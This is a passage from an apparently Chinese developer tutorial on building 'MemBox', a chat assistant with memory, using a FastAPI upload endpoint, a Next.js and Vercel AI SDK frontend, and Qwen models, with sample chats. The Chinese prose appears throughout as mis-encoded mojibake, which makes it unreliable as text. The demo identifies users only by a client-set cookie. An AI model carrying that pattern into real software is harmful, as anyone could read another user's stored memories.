<p><strong>æ³¨æ„</strong>ï¼šPowerMem ä¹ŸåŸç”Ÿæ”¯æŒå¤šæ¨¡æ€è®°å¿†ï¼Œå¯ä»¥åœ¨é…ç½®ä¸­è®¾ç½® <code>enable_vision: True</code> å’Œ <code>vision_details: "auto"</code> å¹¶é…ç½®ç›¸åº”çš„å¤šæ¨¡æ€æ¨¡å‹ï¼ˆå¦‚ qwen-vl-plusï¼‰ï¼Œè®©åç«¯ç›´æ¥ç†è§£å›¾ç‰‡å†…å®¹å¹¶å­˜å‚¨ä¸ºè®°å¿†ã€‚å…·ä½“å‚è€ƒ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Foceanbase%2Fpowermem%2Fblob%2Fmain%2Fdocs%2Fexamples%2Fscenario_7_multimodal.md" target="_blank" title="https://github.com/oceanbase/powermem/blob/main/docs/examples/scenario_7_multimodal.md" ref="nofollow noopener noreferrer">PowerMem å¤šæ¨¡æ€ç¤ºä¾‹</a>ã€‚</p>
</blockquote>
<h3 data-id="heading-14">7.1 å›¾ç‰‡ä¸Šä¼  API</h3>
<p>åç«¯ <code>routes/upload.py</code> æä¾›å›¾ç‰‡ä¸Šä¼ æ¥å£ï¼Œå°†å›¾ç‰‡ä¿å­˜åˆ°æœ¬åœ°å¹¶è¿”å›è®¿é—® URLï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@router.post(<span class="hljs-params"><span class="hljs-string">"/images"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_images</span>(<span class="hljs-params">
    files: <span class="hljs-type">List</span>[UploadFile] = File(<span class="hljs-params">...</span>),
    user_id: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params">...</span>)
</span>):
    <span class="hljs-keyword">try</span>:
        uploaded_urls = []
        uploaded_filenames = []
        
        <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:
            <span class="hljs-comment"># Check file type</span>
            ext = get_file_extension(file.filename)
            <span class="hljs-keyword">if</span> ext <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ALLOWED_EXTENSIONS:
                <span class="hljs-keyword">raise</span> HTTPException(...)
            
            <span class="hljs-comment"># Generate filename and save</span>
            filename = generate_filename(file.filename)
            filepath = os.path.join(UPLOAD_DIR, filename)
            
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filepath, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:
                content = <span class="hljs-keyword">await</span> file.read()
                f.write(content)
            
            <span class="hljs-comment"># Generate image URL</span>
            base_url = os.getenv(<span class="hljs-string">"BASE_URL"</span>, <span class="hljs-string">"http://localhost:8000"</span>)
            image_url = <span class="hljs-string">f"<span class="hljs-subst">{base_url}</span>/uploads/<span class="hljs-subst">{filename}</span>"</span>
            
            uploaded_urls.append(image_url)
            uploaded_filenames.append(filename)
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">"success"</span>: <span class="hljs-literal">True</span>,
            <span class="hljs-string">"count"</span>: <span class="hljs-built_in">len</span>(uploaded_urls),
            <span class="hljs-string">"filenames"</span>: uploaded_filenames,
            <span class="hljs-string">"urls"</span>: uploaded_urls
        }
    
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-comment"># ... error handling</span>
        <span class="hljs-keyword">raise</span> HTTPException(status_code=<span class="hljs-number">500</span>, detail=<span class="hljs-built_in">str</span>(e))
</code></pre>
<h3 data-id="heading-15">7.2 å¯åŠ¨åç«¯</h3>
<p>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯åŠ¨åç«¯æœåŠ¡ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> backend
uv run membox
</code></pre>
<h2 data-id="heading-16">8. æ­å»ºå‰ç«¯ï¼ˆNext.js + Vercel AI SDKï¼‰</h2>
<p>å‰ç«¯åŸºäº Next.js æ„å»ºï¼Œä¸»è¦ä½¿ç”¨ä»¥ä¸‹æŠ€æœ¯æ ˆï¼š</p>
<ul>
<li>Vercel AI SDK</li>
<li>AI Elements</li>
<li>ui-ux-pro-max-skill</li>
</ul>
<h3 data-id="heading-17">8.1 Vercel AI SDK</h3>
<p>å°†å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰é›†æˆåˆ°åº”ç”¨ä¸­æ˜¯ä¸€ä»¶å¤æ‚çš„äº‹æƒ…ï¼Œè€Œä¸”é«˜åº¦ä¾èµ–äºä½ ä½¿ç”¨çš„æ¨¡å‹æä¾›å•†ã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Fai-sdk.dev%2F" target="_blank" title="https://ai-sdk.dev/" ref="nofollow noopener noreferrer">Vercel AI SDK</a> æ ‡å‡†åŒ–äº†è·¨ä¸åŒæä¾›å•†çš„ AI æ¨¡å‹é›†æˆæ–¹å¼ï¼Œè®©å¼€å‘è€…å¯ä»¥ä¸“æ³¨äºæ„å»ºä¼˜ç§€çš„ AI åº”ç”¨ï¼Œè€Œä¸æ˜¯åœ¨æŠ€æœ¯ç»†èŠ‚ä¸Šæµªè´¹æ—¶é—´ã€‚</p>
<p>AI SDK åŒ…å«ä¸¤ä¸ªä¸»è¦æ¨¡å—ï¼š</p>
<ul>
<li><strong>AI SDK Core</strong>ï¼šæä¾›ç»Ÿä¸€çš„ APIï¼Œç”¨äºç”Ÿæˆæ–‡æœ¬ã€ç»“æ„åŒ–å¯¹è±¡ã€å·¥å…·è°ƒç”¨ä»¥åŠä½¿ç”¨ LLM æ„å»º Agentã€‚</li>
<li><strong>AI SDK UI</strong>ï¼šæä¾›ä¸€ç»„ä¸æ¡†æ¶æ— å…³çš„ hooksï¼Œç”¨äºå¿«é€Ÿæ„å»ºèŠå¤©ç•Œé¢å’Œç”Ÿæˆå¼ UIã€‚</li>
</ul>
<h3 data-id="heading-18">8.2 AI Elements</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fai-elements.dev%2F" target="_blank" title="https://ai-elements.dev/" ref="nofollow noopener noreferrer">AI Elements</a> æ˜¯åŸºäº shadcn/ui æ„å»ºçš„ç»„ä»¶åº“ï¼Œå¸®åŠ©å¼€å‘è€…æ›´å¿«åœ°æ„å»º AI åŸç”Ÿåº”ç”¨ã€‚å®ƒæä¾›äº†é¢„æ„å»ºçš„ç»„ä»¶ï¼Œå¦‚å¯¹è¯æ¡†ã€æ¶ˆæ¯æ°”æ³¡ç­‰ï¼Œå¯ä»¥é€šè¿‡ CLI å‘½ä»¤å¿«é€Ÿå®‰è£…ï¼š</p>
<h3 data-id="heading-19">8.3 UI/UX è®¾è®¡</h3>
<p>æœ¬é¡¹ç›®ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnextlevelbuilder%2Fui-ux-pro-max-skill" target="_blank" title="https://github.com/nextlevelbuilder/ui-ux-pro-max-skill" ref="nofollow noopener noreferrer">ui-ux-pro-max-skill</a> è¾…åŠ©è®¾è®¡é¡µé¢é£æ ¼å’Œæ ·å¼ã€‚è¿™æ˜¯ä¸€ä¸ª AI Skillï¼Œèƒ½å¤Ÿä¸ºå¤šå¹³å°æä¾›ä¸“ä¸šçš„ UI/UX è®¾è®¡æ™ºèƒ½ï¼Œè‡ªåŠ¨ç”Ÿæˆè®¾è®¡ç³»ç»Ÿå¹¶æ¨èæœ€ä½³çš„é¢œè‰²ã€å­—ä½“å’Œé—´è·æ–¹æ¡ˆã€‚</p>
<h3 data-id="heading-20">8.4 èŠå¤©çŠ¶æ€ç®¡ç†</h3>
<p><code>app/page.tsx</code> æ˜¯å‰ç«¯çš„æ ¸å¿ƒé¡µé¢ï¼Œä½¿ç”¨å¤šä¸ª hooks ç®¡ç†çŠ¶æ€ï¼š</p>
<ul>
<li><strong>useUser</strong>ï¼šç®¡ç†ç”¨æˆ·ç™»å½•ã€åˆ‡æ¢ã€ç™»å‡ºã€‚</li>
<li><strong>useChatSessions</strong>ï¼šç®¡ç†èŠå¤©ä¼šè¯çš„åˆ›å»ºã€åˆ‡æ¢ã€åˆ é™¤ï¼ŒæŒ‰ç”¨æˆ·éš”ç¦»ã€‚</li>
<li><strong>useChat</strong>ï¼šVercel AI SDK æä¾›çš„ hookï¼Œç®¡ç†æ¶ˆæ¯å‘é€å’Œæ¥æ”¶ã€‚</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { useChat } <span class="hljs-keyword">from</span> <span class="hljs-string">"@ai-sdk/react"</span>;
<span class="hljs-keyword">import</span> { useChatSessions } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/hooks/use-chat-sessions"</span>;
<span class="hljs-keyword">import</span> { useUser } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/hooks/use-user"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Home</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [pendingImages, setPendingImages] = useState&lt;<span class="hljs-built_in">string</span>[]&gt;([]);
  
  <span class="hljs-comment">// ç”¨æˆ·ç®¡ç†</span>
  <span class="hljs-keyword">const</span> { currentUser, login, switchUser, logout } = <span class="hljs-title function_">useUser</span>();

  <span class="hljs-comment">// èŠå¤©ä¼šè¯ç®¡ç†ï¼ˆæŒ‰ç”¨æˆ·è¿‡æ»¤ï¼‰</span>
  <span class="hljs-keyword">const</span> {
    sessions,
    currentSession,
    currentSessionId,
    createSession,
    updateSessionMessages,
    deleteSession,
    selectSession,
    newChat,
  } = <span class="hljs-title function_">useChatSessions</span>(currentUser?.<span class="hljs-property">id</span> ?? <span class="hljs-literal">null</span>);

  <span class="hljs-comment">// èŠå¤© hook</span>
  <span class="hljs-keyword">const</span> { messages, sendMessage, status, setMessages, stop } = <span class="hljs-title function_">useChat</span>({
    <span class="hljs-attr">id</span>: currentSessionId || <span class="hljs-literal">undefined</span>,
  });

  <span class="hljs-comment">// å½“æ¶ˆæ¯å˜åŒ–æ—¶ï¼ŒåŒæ­¥åˆ°ä¼šè¯</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (currentSessionId &amp;&amp; messages.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-title function_">updateSessionMessages</span>(currentSessionId, messages);
    }
  }, [messages, currentSessionId, updateSessionMessages]);

  <span class="hljs-comment">// åˆ‡æ¢ä¼šè¯æ—¶ï¼ŒåŠ è½½å¯¹åº”çš„æ¶ˆæ¯</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (currentSession) {
      <span class="hljs-title function_">setMessages</span>(currentSession.<span class="hljs-property">messages</span>);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-title function_">setMessages</span>([]);
    }
  }, [currentSessionId, setMessages]);
  
  <span class="hljs-comment">// ...</span>
}
</code></pre>
<h3 data-id="heading-21">8.5 å‘é€å¤šæ¨¡æ€æ¶ˆæ¯</h3>
<p>æ„å»ºåŒ…å«æ–‡æœ¬å’Œå›¾ç‰‡çš„å¤šæ¨¡æ€æ¶ˆæ¯ï¼ˆ<code>app/page.tsx</code>ï¼‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> handleSubmit = <span class="hljs-title function_">useCallback</span>(
  <span class="hljs-keyword">async</span> (<span class="hljs-attr">message</span>: { <span class="hljs-attr">text</span>: <span class="hljs-built_in">string</span> }) =&gt; {
    <span class="hljs-keyword">if</span> (!message.<span class="hljs-property">text</span>.<span class="hljs-title function_">trim</span>() &amp;&amp; pendingImages.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-comment">// å°† userId å­˜å…¥ cookieï¼Œä¾› API Route è¯»å–</span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">`membox_user_id=<span class="hljs-subst">${userId}</span>; path=/; max-age=86400`</span>;

    <span class="hljs-comment">// æ„å»ºåŒ…å«å›¾ç‰‡å’Œæ–‡æœ¬çš„ parts æ•°ç»„</span>
    <span class="hljs-keyword">const</span> <span class="hljs-attr">parts</span>: <span class="hljs-title class_">Array</span>&lt;
      { <span class="hljs-attr">type</span>: <span class="hljs-string">'text'</span>; <span class="hljs-attr">text</span>: <span class="hljs-built_in">string</span> } | 
      { <span class="hljs-attr">type</span>: <span class="hljs-string">'file'</span>; <span class="hljs-attr">mediaType</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span> }
    &gt; = [];
    
    <span class="hljs-comment">// å…ˆæ·»åŠ å›¾ç‰‡</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> url <span class="hljs-keyword">of</span> pendingImages) {
      parts.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">type</span>: <span class="hljs-string">'file'</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>,
        <span class="hljs-attr">mediaType</span>: <span class="hljs-string">'image/png'</span>,
        <span class="hljs-attr">url</span>: url,
      });
    }
    
    <span class="hljs-comment">// å†æ·»åŠ æ–‡æœ¬</span>
    parts.<span class="hljs-title function_">push</span>({
      <span class="hljs-attr">type</span>: <span class="hljs-string">'text'</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>,
      <span class="hljs-attr">text</span>: message.<span class="hljs-property">text</span> || <span class="hljs-string">'Please describe these images'</span>,
    });

    <span class="hljs-comment">// æ¸…ç©ºå¾…å‘é€çš„å›¾ç‰‡</span>
    <span class="hljs-title function_">setPendingImages</span>([]);

    <span class="hljs-comment">// å‘é€æ¶ˆæ¯åˆ° /api/chatï¼Œç”± API Route è°ƒç”¨ LLM</span>
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">sendMessage</span>({ parts });
  },
  [sendMessage, userId, pendingImages]
);
</code></pre>
<h3 data-id="heading-22">8.6 è°ƒç”¨ LLM ç”Ÿæˆå›å¤</h3>
<p><code>app/api/chat/route.ts</code> æ˜¯å‰ç«¯çš„æ ¸å¿ƒ API Routeï¼Œè´Ÿè´£ï¼š</p>
<ol>
<li><strong>æœç´¢è®°å¿†</strong>ï¼šè°ƒç”¨åç«¯ <code>/api/memory/search</code> è·å–ç›¸å…³è®°å¿†å’Œç”¨æˆ·ç”»åƒã€‚</li>
<li><strong>è°ƒç”¨ LLM</strong>ï¼šå°†è®°å¿†ä¸Šä¸‹æ–‡æ³¨å…¥ System Promptï¼Œè°ƒç”¨åƒé—®æ¨¡å‹ç”Ÿæˆå›å¤ã€‚</li>
<li><strong>ä¿å­˜è®°å¿†</strong>ï¼šåœ¨ LLM å›å¤å®Œæˆåï¼Œè°ƒç”¨åç«¯ <code>/api/memory/add</code> ä¿å­˜è®°å¿†ã€‚</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { convertToModelMessages, streamText, consumeStream, <span class="hljs-title class_">UIMessage</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'ai'</span>;
<span class="hljs-keyword">import</span> { createOpenAICompatible } <span class="hljs-keyword">from</span> <span class="hljs-string">'@ai-sdk/openai-compatible'</span>;

<span class="hljs-comment">// åˆ›å»º Qwen å®¢æˆ·ç«¯ï¼ˆå…¼å®¹ OpenAI åè®®ï¼‰</span>
<span class="hljs-keyword">const</span> qwen = <span class="hljs-title function_">createOpenAICompatible</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">'qwen'</span>,
  <span class="hljs-attr">apiKey</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">DASHSCOPE_API_KEY</span>,
  <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'https://dashscope.aliyuncs.com/compatible-mode/v1'</span>,
});

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">POST</span>(<span class="hljs-params">req: Request</span>) {
  <span class="hljs-comment">// æ¥æ”¶å‰ç«¯å‘é€çš„å¯¹è¯å†å²ï¼ˆåŒ…å« parts æ ¼å¼çš„å¤šæ¨¡æ€æ¶ˆæ¯ï¼‰</span>
  <span class="hljs-keyword">const</span> { messages }: { <span class="hljs-attr">messages</span>: <span class="hljs-title class_">UIMessage</span>[] } = <span class="hljs-keyword">await</span> req.<span class="hljs-title function_">json</span>();

  <span class="hljs-comment">// ä» cookie è·å–ç”¨æˆ· ID</span>
  <span class="hljs-keyword">const</span> cookies = req.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'cookie'</span>) || <span class="hljs-string">''</span>;
  <span class="hljs-keyword">const</span> userIdMatch = cookies.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/membox_user_id=([^;]+)/</span>);
  <span class="hljs-keyword">const</span> userId = userIdMatch?.[<span class="hljs-number">1</span>] ?? <span class="hljs-string">'default_user'</span>;

  <span class="hljs-comment">// è·å–æœ€åä¸€æ¡ç”¨æˆ·æ¶ˆæ¯çš„æ–‡æœ¬</span>
  <span class="hljs-keyword">const</span> lastMessage = messages.<span class="hljs-title function_">at</span>(-<span class="hljs-number">1</span>);
  <span class="hljs-keyword">const</span> lastMessageText = lastMessage?.<span class="hljs-property">parts</span>?.<span class="hljs-title function_">find</span>(<span class="hljs-function">(<span class="hljs-params">p</span>) =&gt;</span> p.<span class="hljs-property">type</span> === <span class="hljs-string">'text'</span>)?.<span class="hljs-property">text</span> ?? <span class="hljs-string">''</span>;

  <span class="hljs-comment">// æ£€æµ‹æ˜¯å¦æœ‰å›¾ç‰‡ï¼Œé€‰æ‹©å¯¹åº”æ¨¡å‹</span>
  <span class="hljs-keyword">const</span> hasImages = messages.<span class="hljs-title function_">some</span>(<span class="hljs-function">(<span class="hljs-params">m</span>) =&gt;</span> m.<span class="hljs-property">parts</span>?.<span class="hljs-title function_">some</span>(<span class="hljs-function">(<span class="hljs-params">p</span>) =&gt;</span> p.<span class="hljs-property">type</span> === <span class="hljs-string">'file'</span>));
  <span class="hljs-keyword">const</span> modelName = hasImages ? <span class="hljs-string">'qwen-vl-plus'</span> : <span class="hljs-string">'qwen-plus'</span>;

  <span class="hljs-comment">// 1. æœç´¢ç›¸å…³è®°å¿†</span>
  <span class="hljs-keyword">const</span> backendUrl = process.<span class="hljs-property">env</span>.<span class="hljs-property">NEXT_PUBLIC_BACKEND_URL</span> ?? <span class="hljs-string">'http://localhost:8000'</span>;
  <span class="hljs-keyword">let</span> memoryContext = <span class="hljs-string">''</span>;
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> searchRes = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`<span class="hljs-subst">${backendUrl}</span>/api/memory/search`</span>, {
      <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
      <span class="hljs-attr">headers</span>: { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> },
      <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
        <span class="hljs-attr">query</span>: lastMessageText,
        <span class="hljs-attr">user_id</span>: userId,
        <span class="hljs-attr">limit</span>: <span class="hljs-number">5</span>,
      }),
    });

    <span class="hljs-keyword">if</span> (searchRes.<span class="hljs-property">ok</span>) {
      <span class="hljs-keyword">const</span> searchData = <span class="hljs-keyword">await</span> searchRes.<span class="hljs-title function_">json</span>();
      <span class="hljs-comment">// ç”¨æˆ·ç”»åƒ</span>
      <span class="hljs-keyword">if</span> (searchData.<span class="hljs-property">profile_content</span>) {
        memoryContext += <span class="hljs-string">`\nUser Profile: <span class="hljs-subst">${searchData.profile_content}</span>`</span>;
      }
      <span class="hljs-comment">// ç›¸å…³è®°å¿†</span>
      <span class="hljs-keyword">if</span> (searchData.<span class="hljs-property">results</span>?.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
        memoryContext += <span class="hljs-string">'\n\nRelated Memories:'</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> mem <span class="hljs-keyword">of</span> searchData.<span class="hljs-property">results</span>) {
          memoryContext += <span class="hljs-string">`\n- <span class="hljs-subst">${mem.memory}</span>`</span>;
        }
      }
    }
  } <span class="hljs-keyword">catch</span> {
    <span class="hljs-comment">// å¿½ç•¥è®°å¿†æœç´¢é”™è¯¯</span>
  }

  <span class="hljs-comment">// 2. æ„å»º System Promptï¼Œæ³¨å…¥è®°å¿†ä¸Šä¸‹æ–‡</span>
  <span class="hljs-keyword">const</span> systemPrompt = <span class="hljs-string">`You are MemBox, an intelligent memory assistant...
<span class="hljs-subst">${memoryContext ? <span class="hljs-string">`Here is background information:<span class="hljs-subst">${memoryContext}</span>`</span> : <span class="hljs-string">''</span>}</span>`</span>;

  <span class="hljs-comment">// 3. è°ƒç”¨ LLM</span>
  <span class="hljs-keyword">const</span> modelMessages = <span class="hljs-keyword">await</span> <span class="hljs-title function_">convertToModelMessages</span>(messages);
  <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">streamText</span>({
    <span class="hljs-attr">model</span>: qwen.<span class="hljs-title function_">chatModel</span>(modelName),
    <span class="hljs-attr">system</span>: systemPrompt,
    <span class="hljs-attr">messages</span>: modelMessages,
    <span class="hljs-comment">// 4. LLM å›å¤å®Œæˆåä¿å­˜è®°å¿†</span>
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">onFinish</span>(<span class="hljs-params">{ text }</span>) {
      <span class="hljs-keyword">const</span> conversationToSave = [
        { <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: lastMessageText || <span class="hljs-string">'User shared images'</span> },
        { <span class="hljs-attr">role</span>: <span class="hljs-string">'assistant'</span>, <span class="hljs-attr">content</span>: text },
      ];
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`<span class="hljs-subst">${backendUrl}</span>/api/memory/add`</span>, {
          <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
          <span class="hljs-attr">headers</span>: { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> },
          <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
            <span class="hljs-attr">messages</span>: conversationToSave,
            <span class="hljs-attr">user_id</span>: userId,
          }),
        });
      } <span class="hljs-keyword">catch</span> {
        <span class="hljs-comment">// å¿½ç•¥ä¿å­˜é”™è¯¯</span>
      }
    },
  });

  <span class="hljs-keyword">return</span> result.<span class="hljs-title function_">toUIMessageStreamResponse</span>({ <span class="hljs-attr">consumeSseStream</span>: consumeStream });
}
</code></pre>
<h3 data-id="heading-23">8.7 å¯åŠ¨å‰ç«¯</h3>
<p>å®‰è£…ä¾èµ–å¹¶å¯åŠ¨å‰ç«¯æœåŠ¡ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> frontend
pnpm install
pnpm dev
</code></pre>
<p>è®¿é—® <a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A3000" target="_blank" title="http://localhost:3000" ref="nofollow noopener noreferrer">http://localhost:3000</a> è®¿é—®é¡µé¢ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6dddedc8eb84b8394c0f74465d34c83~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2U3ZW4yNTg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523361&amp;x-signature=NLn7qo%2FkX4TLPqxYtjipCGkSgRM%3D" alt="" loading="lazy"/></p>
<p>è¾“å…¥ç”¨æˆ·ååå³å¯å¼€å§‹èŠå¤©å¯¹è¯ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/41a30cfef99a42778eaa65e35d47697d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2U3ZW4yNTg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523361&amp;x-signature=UnNB10H4AynljOSCBaagMEG8CXs%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-24">9. æ•ˆæœæ¼”ç¤º</h2>
<h3 data-id="heading-25">9.1 æ™ºèƒ½è®°å¿†</h3>
<p>é¦–å…ˆçœ‹çœ‹ PowerMem çš„ <strong>Intelligent Memoryï¼ˆæ™ºèƒ½è®°å¿†ï¼‰</strong> åŠŸèƒ½ï¼š</p>
<blockquote>
<p>ğŸ‘¤ Sevenï¼šæˆ‘æ˜¯ Sevenï¼Œåœ¨ä¸Šæµ·å·¥ä½œï¼Œå–œæ¬¢è¸¢è¶³çƒ</p>
<p>ğŸ¤– MemBoxï¼šå—¨ Sevenï¼ä¸Šæµ·çš„è¶³çƒæ°›å›´æŒºä¸é”™çš„ï¼Œé»„æµ¦åŒºå’Œå¾æ±‡åŒºéƒ½æœ‰å¾ˆå¤šçƒåœºï¼Œå‘¨æœ«ç»å¸¸èƒ½çœ‹åˆ°ä¸šä½™è”èµ›ã€‚ä½ å¹³æ—¶éƒ½åœ¨å“ªä¸ªåŒºåŸŸè¸¢çƒå‘€ï¼Ÿè¦æ˜¯ä½ å–œæ¬¢çš„è¯ï¼Œæˆ‘è¿˜å¯ä»¥æ¨èå‡ ä¸ªä¸é”™çš„è¶³çƒç¤¾ç¾¤ç»™ä½ ~</p>
</blockquote>
<p>PowerMem ä¼šå°†è¿™äº›ä¿¡æ¯æŒä¹…åŒ–å­˜å‚¨åˆ° SeekDB ä¸­ï¼Œå³ä½¿ä¼šè¯ç»“æŸä¹Ÿä¸ä¼šä¸¢å¤±ï¼Œéšæ—¶å¯ä»¥åœ¨åç»­å¯¹è¯ä¸­è¢«æ™ºèƒ½æ£€ç´¢å’Œä½¿ç”¨ã€‚</p>
<h3 data-id="heading-26">9.2 è®°å¿†æ£€ç´¢</h3>
<p>å½“ç”¨æˆ·å‘èµ·æ–°å¯¹è¯æ—¶ï¼ŒMemBox ä¼š<strong>è‡ªåŠ¨æ ¹æ®å½“å‰é—®é¢˜æ£€ç´¢ç›¸å…³è®°å¿†</strong>ã€‚è¿™æ˜¯é€šè¿‡ SeekDB çš„å‘é‡ç›¸ä¼¼åº¦æœç´¢å®ç°çš„â€”â€”å°†ç”¨æˆ·é—®é¢˜è½¬æ¢ä¸ºå‘é‡ï¼Œåœ¨è®°å¿†åº“ä¸­æ‰¾åˆ°è¯­ä¹‰æœ€ç›¸è¿‘çš„å†…å®¹ã€‚</p>
<p>ä¸‹æ¬¡å¯¹è¯æ—¶ï¼Œå³ä½¿ç”¨æˆ·æ²¡æœ‰æ˜ç¡®æåŠä¹‹å‰è¯´è¿‡çš„å†…å®¹ï¼ŒMemBox ä¹Ÿèƒ½æ™ºèƒ½å…³è”ï¼š</p>
<blockquote>
<p>ğŸ‘¤ Sevenï¼šå‘¨æœ«æœ‰ä»€ä¹ˆæ´»åŠ¨æ¨èï¼Ÿ</p>
<p>ğŸ¤– MemBoxï¼šHey Sevenï¼æ—¢ç„¶ä½ åœ¨ä¸Šæµ·è€Œä¸”å–œæ¬¢è¸¢è¶³çƒï¼Œå‘¨æœªä¸å¦‚æ¥åœºé…£ç•…æ·‹æ¼“çš„çƒå±€å§ï¼......</p>
</blockquote>
<p>æ³¨æ„ï¼ŒSeven å¹¶æ²¡æœ‰å†æ¬¡æåˆ°"è¶³çƒ"ï¼Œä½† MemBox è‡ªåŠ¨æ£€ç´¢åˆ°äº†ä¹‹å‰è®°å¿†çš„å…´è¶£çˆ±å¥½ï¼Œå¹¶æ®æ­¤ç»™å‡ºä¸ªæ€§åŒ–æ¨èã€‚</p>
<h3 data-id="heading-27">9.3 å¤šæ¨¡æ€è®°å¿†</h3>
<p>MemBox ä¸ä»…èƒ½è®°ä½æ–‡å­—ï¼Œè¿˜èƒ½<strong>ç†è§£å’Œè®°å¿†å›¾ç‰‡å†…å®¹</strong>ã€‚å½“ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡æ—¶ï¼Œå‰ç«¯ä¼šè°ƒç”¨å¤šæ¨¡æ€ LLMï¼ˆqwen-vl-plusï¼‰æ¥ç†è§£å›¾ç‰‡ï¼Œç„¶åå°†ç†è§£ç»“æœä½œä¸ºè®°å¿†å­˜å‚¨ï¼š</p>
<blockquote>
<p>ğŸ‘¤ Sevenï¼š[ä¸Šä¼ ä¸€å¼ çŒ«çš„ç…§ç‰‡] è¿™æ˜¯æˆ‘çš„çŒ«å’ªå°è“</p>
<p>ğŸ¤– MemBoxï¼šå“‡ï¼Œå°è“çœ‹èµ·æ¥å¥½å¯çˆ±ï¼è¿™åªç°ç™½ç›¸é—´çš„çŒ«å’ªè¶´åœ¨æŸ”è½¯çš„æ¯¯å­ä¸Šï¼Œé˜³å…‰æ´’åœ¨å®ƒèº«ä¸Šï¼ŒçœŸæ˜¯æ²»æ„ˆç³»çš„ç”»é¢ã€‚ä½ ä¸€å®šå¾ˆçˆ±å®ƒå§ï¼ŸçŒ«å’ªæ€»æ˜¯èƒ½å¸¦æ¥æ¸©æš–å’Œæ”¾æ¾çš„æ„Ÿè§‰ï¼Œçœ‹ç€å®ƒå®‰é™çš„æ ·å­ï¼Œå¿ƒæƒ…éƒ½ä¼šå˜å¥½å‘¢ï½</p>
</blockquote>
